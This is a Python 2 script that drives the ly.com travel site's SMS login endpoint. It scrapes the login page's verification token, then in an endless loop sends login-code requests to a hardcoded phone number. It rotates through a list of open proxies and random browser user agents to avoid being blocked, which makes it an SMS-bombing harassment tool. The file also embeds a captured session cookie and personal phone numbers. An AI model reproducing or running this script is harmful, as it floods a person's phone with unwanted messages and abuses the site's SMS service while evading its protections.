# -*- coding:utf-8 -*-

"""
 Verion: 1.0
 Author: zhangjian
 Site: http://iliangqunru.com
 File: ly_sms.py
 Time: 2016/10/2 19:11
 Des: 同城旅游网sms
"""
import logging
import sys
import requests
import lxml.html
import random

import threadpool
import time

level = logging.DEBUG
format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
datefmt = '%Y-%m-%d %H:%M'
logging.basicConfig(level=level, format=format, datefmt=datefmt)
logger = logging.getLogger(__name__)
PROXIES = [
    {'http': 'http://103.224.118.191:80'},
    {'http': 'http://132.148.27.105:80'},
    {'http': 'http://185.114.234.21:80'},
    {'http': 'http://190.85.222.164:80'},
    {'http': 'http://94.202.104.202:80'},
    {'http': 'http://174.129.204.124:80'},
    {'http': 'http://185.23.142.89:80'},
    {'http': 'http://88.191.174.188:80'},
    {'http': 'http://169.50.87.252:80'},
    {'http': 'http://94.206.35.6:80'},
    {'http': 'http://163.172.12.246:80'},
    {'http': 'http://23.94.32.162:80'},
    {'http': 'http://94.203.96.16:80'},
    {'http': 'http://146.66.136.92:80'},
    {'http': 'http://158.181.151.181:3128'},
    {'http': 'http://173.224.124.210:8080'},
    {'http': 'http://52.59.18.222:80'},
    {'http': 'http://31.43.2.201:3128'},
    {'https': 'https://119.252.160.34:8080'},
    {'http': 'http://188.166.222.58:80'},
    {'http': 'http://78.23.244.145:80'},
    {'http': 'http://212.227.159.39:80'},
    {'http': 'http://88.159.78.135:80'},
    {'http': 'http://5.9.108.207:80'},
    {'http': 'http://46.127.77.61:80'},
    {'https': 'https://182.162.141.7:80'},
    {'http': 'http://52.49.115.68:80'},
    {'http': 'http://162.243.47.142:80'},
    {'http': 'http://128.123.177.241:80'},
    {'http': 'http://47.88.104.219:80'},
    {'http': 'http://84.195.185.10:80'},
    {'http': 'http://51.255.161.222:80'},
    {'http': 'http://104.129.57.89:80'},
    {'http': 'http://47.89.9.170:80'},
    {'http': 'http://166.155.239.80:80'},
    {'http': 'http://80.112.179.53:80'},
    {'http': 'http://139.217.8.125:80'},
    {'http': 'http://80.190.121.242:80'},
    {'http': 'http://74.208.146.112:80'},
    {'http': 'http://80.112.170.75:80'},
    {'http': 'http://212.166.53.168:80'},
    {'http': 'http://109.90.222.207:80'},
    {'http': 'http://37.1.39.126:80'},
    {'http': 'http://52.64.219.214:80'},
    {'http': 'http://172.245.219.137:80'},
    {'http': 'http://52.210.229.46:80'},
    {'http': 'http://65.19.141.156:80'},
    {'http': 'http://52.208.126.100:80'},
    {'http': 'http://84.38.67.120:80'},
    {'http': 'http://104.199.206.138:80'},
    {'http': 'http://200.105.238.162:80'},
    {'http': 'http://91.134.221.52:80'}]

USER_AGENT_LIST = [
    'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.43 Safari/537.31',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)',
    'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
    'Mozilla/5.0 (Windows; U; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)',
    'Mozilla/6.0 (Windows NT 6.2; WOW64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1',
    'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:15.0) Gecko/20100101 Firefox/15.0.1',
    'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:15.0) Gecko/20120910144328 Firefox/15.0.2',
    'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201',
    'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
    'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.13; ) Gecko/20101203',
    'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14',
    'Opera/9.80 (X11; Linux x86_64; U; fr) Presto/2.9.168 Version/11.50',
    'Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; de) Presto/2.9.168 Version/11.52',
    'Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285',
    'Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1.7pre) Gecko/20070815 Firefox/2.0.0.6 Navigator/9.0b3',
    'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.12) Gecko/20080219 Firefox/2.0.0.12 Navigator/9.0.0.6',
]

proxies = {"proxies": random.choice(PROXIES)}


def singleton(cls):
    instance = cls()
    instance.__call__ = lambda: instance
    return instance


class Ly():
    def __init__(self, phone_no):
        self.phone_no = phone_no
        self.session = requests.Session()
        self.fish = None
        self.globalCookies = {}
        self.headers = {
            "Host": "passport.ly.com",
            "Origin": "https://passport.ly.com",
            "Referer": "https://passport.ly.com/m/login.html",
            "User-Agent": random.choice(USER_AGENT_LIST),
            "Cookie": "td=7979ec045bba43d2ae9d33bb0759eb62; abtestKey=8ee2a1ca-1feb-447d-9231-693a12e18410; NewProvinceId=16; NCid=224; TicketSEInfo=RefId=0&SEFrom=&SEKeyWords=; qdid=-9999; CNSEInfo=RefId=10758821&tcbdkeyid=&SEFrom=&SEKeyWords=&RefUrl=; 17uCNRefId=10758821; locationinfo=%7B%22latitude%22%3A%22%22%2C%22longitude%22%3A%22%22%2C%22city%22%3A%22%E5%8D%97%E4%BA%AC%22%2C%22cityCode%22%3A224%7D; _trackClick=#mainPage>1; __RequestVerificationToken_L20_=NwGr2nQrl9VNDyYMzhAQcieQLz0QRwFRDNi1gy7Z+bW9WIat7+5o6m1iwSgAGnsB9BbQ6Xh+0EFBSYRqnR7avpCNT/CgJ4uqJ6OBVroOfva6zUy0Xw1umnrx9Fx0Qz8m++GFqZbfMRp8W57YSDHrrBxWQ3+ekzRm8JH3uELF/uw=; route=5eb8f102a9c96679f2ea9236f86cbdf0; __tctmc=144323752.131910798; __tctmd=144323752.173394815; __tctma=144323752.1475405455694520.1475405455233.1475583105333.1476458358308.5; __tctmb=144323752.3506814509741689.1476458380382.1476458386900.3; __tctmu=144323752.0.0; __tctmz=144323752.1476458358308.5.1.utmccn=(direct)|utmcsr=(direct)|utmcmd=(none); longKey=1475405455694520; __tctrack=0; _fmdata=430868901C6CDD853BD21D2EA878F714B009EFCFD026F38E73F570F4519008E351F54CD22E1BD49B924320B306EA82B3EADE993B1614E3EE",
        }

    def first_blood(self):
        url = "http://m.ly.com/"
        r = self.session.get(url=url, headers=self.headers,timeout=5)
        self.globalCookies = self.session.cookies.get_dict()

    def get_fish(self):
        """
        抓鱼
        :return:
        """
        try:
            url = "https://passport.ly.com/m/login.html"

            r = self.session.get(url=url, headers=self.headers,
                                 timeout=5)
            h = lxml.html.fromstring(r.content)
            token = ''.join(h.xpath("//form[@id='smslogin']/input[@name ='__RequestVerificationToken']/@value"))
            self.fish = token
            self.globalCookies = self.session.cookies.get_dict()
            print self.session.cookies.get_dict()
            print self.globalCookies
            print token

        except Exception as ex:
            print ex
            pass

    def send_sms(self):
        """
        发送短信
        :return:
        """

        if self.fish:
            try:
                url = "https://passport.ly.com/m/login/loginviasms"
                data = {
                    "mobile1": self.phone_no,
                    "validCode": '',
                    "__RequestVerificationToken": self.fish,
                    'returnUrl': '/fuckly',
                    'action': 1,
                    "mobile": self.phone_no
                }

                logger.info("短信参数:%s" % data)

                r = self.session.post(url=url, headers=self.headers, data=data, cookies=self.globalCookies,
                                      proxies=proxies
                                      , timeout=5)
                print r.content

            except Exception as ex:
                print ex
                pass


def tmp():
    l = Ly("18852996865")
    # l = Ly("13515105572")
    l.get_fish()
    while True:
        l.send_sms()


if __name__ == '__main__':
    tmp()
